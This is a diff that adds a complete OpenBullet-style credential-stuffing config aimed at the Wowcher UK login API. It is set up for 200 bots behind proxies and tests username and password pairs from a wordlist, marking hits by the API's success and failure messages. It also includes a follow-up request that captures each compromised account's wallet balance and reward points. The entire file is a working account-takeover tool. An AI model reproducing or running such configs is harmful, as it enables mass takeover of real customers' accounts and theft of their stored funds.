@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Wowcher UK",
+  "SuggestedBots": 200,
+  "LastModified": "2018-12-25T19:42:32.3733023+00:00",
+  "AdditionalInfo": "",
+  "Author": "YungChef",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://public-api.wowcher.co.uk/v1/login?_spring_security_remember_me=true" AutoRedirect=TRUE 
+  CONTENT "{\"loginRequest\":{\"j_username\":\"<USER>\",\"j_password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: public-api.wowcher.co.uk" 
+  HEADER "Origin: https://secure.wowcher.co.uk" 
+  HEADER "App-Platform: WEBAPP-DESKTOP" 
+  HEADER "Country-Code: GB" 
+  HEADER "Access-Control-Allow-Credentials: true" 
+  HEADER "webapp: true" 
+  HEADER "brand: wowcher" 
+  HEADER "version: v1.1" 
+  HEADER "Referer: https://secure.wowcher.co.uk/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email/password" 
+  KEYCHAIN Success OR 
+    KEY "result\":\"SUCCESS\",\"" 
+#REDIRECT REQUEST GET "https://api.wowcher.co.uk/reward/details" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://secure.wowcher.co.uk" 
+  HEADER "App-Platform: WEBAPP-DESKTOP" 
+  HEADER "Country-Code: GB" 
+  HEADER "Access-Control-Allow-Credentials: true" 
+  HEADER "webapp: true" 
+  HEADER "brand: wowcher" 
+  HEADER "version: v1.1" 
+  HEADER "Referer: https://secure.wowcher.co.uk/login" 
+PARSE "<SOURCE>" JSON "currentLevel" Recursive=FALSE -> CAP "currentLevel" "" "" 
+PARSE "<SOURCE>" JSON "pointsToNextLevel" Recursive=FALSE -> CAP "pointsToNextLevel" "" "" 
+PARSE "<SOURCE>" JSON "gbpWalletBalance" Recursive=FALSE -> CAP "gbpWalletBalance" "" "" 
+PARSE "<SOURCE>" JSON "lifetimePoints" Recursive=FALSE -> CAP "lifetimePoints" "" "" 
+PARSE "<SOURCE>" JSON "currentPoints" Recursive=FALSE -> CAP "currentPoints" "" "" 
